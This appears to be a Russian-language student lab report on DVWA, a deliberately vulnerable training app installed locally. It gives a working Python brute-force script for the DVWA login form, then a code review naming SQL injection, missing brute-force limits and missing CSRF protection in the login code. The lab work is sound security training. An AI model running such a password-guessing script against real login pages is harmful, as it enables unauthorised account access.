# pr3
## Установка
Архив DVWA был скачан с официального ресурса github, затем установлен с использованием дистрибутива OSPanel.
![image](https://github.com/user-attachments/assets/ba34beeb-ad1e-4daf-986c-7c5c8635b7bf)
Адрес: http://dvwa.local/login.php
![image](https://github.com/user-attachments/assets/4e7ff5dd-26b2-4344-8767-ff9e571b4cad)
## Задания
1.Необходимо разработать переборщик паролей для формы в задании Bruteforce на сайте dvwa.local.
Было решено помочь программе установкой префикса "passwo" для того, чтобы уменьшить время подбоа пароля.
```python
import itertools
import requests
import time

# Настройки
URL = "http://dvwa.local/vulnerabilities/brute/"
USERNAME = "admin"
CHARSET = 'abcdefghijklmnopqrstuvwxyz'
PASSWORD_LENGTH = 8
PREFIX = "passwo"
SESSION = requests.Session()

# Устанавливаем cookie для авторизации
SESSION.cookies.set("PHPSESSID", "mgg4vgt0fcdtg672ead6ujaa02a5eu1h")
SESSION.cookies.set("security", "low")


def generate_passwords(prefix, length, charset):
    remaining_length = length - len(prefix)
    return (
        prefix + ''.join(comb)
        for comb in itertools.product(charset, repeat=remaining_length)
    )


def is_password_correct(url, username, password):
    params = {'username': username, 'password': password, 'Login': 'Login'}
    try:
        response = SESSION.get(url, params=params)
        return "Welcome to the password protected area" in response.text
    except requests.exceptions.RequestException as e:
        print(f"[-] Ошибка при запросе: {e}")
        return False


def main():
    start_time = time.time()
    print("[*] Начинаем подбор пароля...")

    for password in generate_passwords(PREFIX, PASSWORD_LENGTH, CHARSET):
        print(f"[*] Пробуем пароль: {password}")
        if is_password_correct(URL, USERNAME, password):
            print(f"[+] Пароль найден: {password}")
            break
    else:
        print("[-] Пароль не найден.")

    end_time = time.time()
    print(f"[+] Время выполнения: {end_time - start_time:.2f} секунд")


if __name__ == "__main__":
    main()
```
Результат работы программы:
![Uploading image.png…]()
2. Проанализировать код и сделать кодревью, указав слабые места. Слабость уязвимого кода необходимо указать с использованием метрики CWE (база данных [cwe.mitre.org](http://cwe.mitre.org))

``` PHP
<?php

if( isset( $_GET[ 'Login' ] ) ) {
	// Get username
	$user = $_GET[ 'username' ];
	// Get password
	$pass = $_GET[ 'password' ];
	$pass = md5( $pass );
	// Check the database
	$query  = "SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';";
	$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
	if( $result && mysqli_num_rows( $result ) == 1 ) {
		// Get users details
		$row    = mysqli_fetch_assoc( $result );
		$avatar = $row["avatar"];
		// Login successful
		$html .= "<p>Welcome to the password protected area {$user}</p>";
		$html .= "<img src=\"{$avatar}\" />";
	}
	else {
		// Login failed
		$html .= "<pre><br />Username and/or password incorrect.</pre>";
	}
	((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}
?>
```
1)SQL Injection (CWE-89): В коде выполняется прямое использование переменных из входных данных ($_GET['username'] и $_GET['password']) в SQL-запросе без какой-либо защиты. Это означает, что злоумышленник может вставить вредоносный SQL-код через параметры запроса и изменить запрос так, чтобы он всегда возвращал истинный результат (например, взломав пароли или получив доступ к базе данных).

2)Код не имеет защиты от атак перебора паролей, таких как блокировка аккаунта или использование капчи после нескольких неудачных попыток входа. Это позволяет злоумышленнику бесконечно пытаться угадать пароль, например, с использованием перебора.

3)Отсутствие защиты от CSRF атак (CWE-352):Код не включает защиту от атак подделки межсайтовых запросов (CSRF). Это значит, что злоумышленник может создать фальшивую форму на другом сайте, которая будет отправлять запросы на авторизацию от имени жертвы, если она уже авторизована на данном сайте.


